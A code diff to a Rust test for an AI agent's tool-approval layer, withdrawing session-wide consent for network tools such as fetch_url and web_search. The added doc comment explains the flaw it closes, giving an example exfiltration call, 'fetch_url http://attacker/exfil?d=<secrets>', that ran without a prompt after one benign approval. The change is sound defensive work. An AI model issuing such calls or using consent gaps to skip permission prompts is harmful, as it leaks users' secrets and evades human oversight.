@@ -1577,14 +1577,32 @@ fn truncate_tool_output_keeps_head_and_tail() {
     assert!(out.chars().count() < 9_000);
 }
 
+/// A by-name session consent is offered exactly where the NAME is the risk.
+///
+/// This assertion used to read the other way for the network tools — "network
+/// tools are the prime session-allow use case" — and the ergonomic half of that
+/// is still true: repeated fetching is the most prompt-heavy thing the model
+/// does. What changed is that the consent turned out to sit ABOVE the egress
+/// floor written for exactly these calls (`is_network_tool` in
+/// `auto_approval_granted`, reached only in the permission-mode layer, which
+/// Layer 1 short-circuits). So one `a` on `fetch_url https://docs.rs/serde`
+/// made every later `fetch_url http://attacker/exfil?d=<secrets>` run with no
+/// prompt, in every mode — the same reasoning that already excluded sub-agent
+/// dispatch, applied to a tool whose entire risk is one argument.
+///
+/// Withdrawn rather than narrowed, deliberately: the honest key for `fetch_url`
+/// is the URL's origin, not its name, and that is a consent granularity this
+/// codebase does not have yet. Users who really want blanket fetching keep the
+/// `approval.auto_allow` list — explicit, persistent, and global-only, so a
+/// repository cannot set it — which Layer 1 consults first.
 #[test]
-fn session_allow_excludes_shell_class_tools() {
+fn session_allow_excludes_the_tools_whose_risk_is_per_argument() {
     use crate::runtime::approval_flow::session_allowable;
     assert!(session_allowable("mock_echo"));
     assert!(session_allowable("write_file"));
     assert!(
-        session_allowable("web_search") && session_allowable("fetch_url"),
-        "network tools are the prime session-allow use case"
+        !session_allowable("fetch_url") && !session_allowable("web_search"),
+        "a name-keyed consent cannot bound a destination chosen per call"
     );
     assert!(!session_allowable("shell"), "shell risk is per-argument");
     assert!(
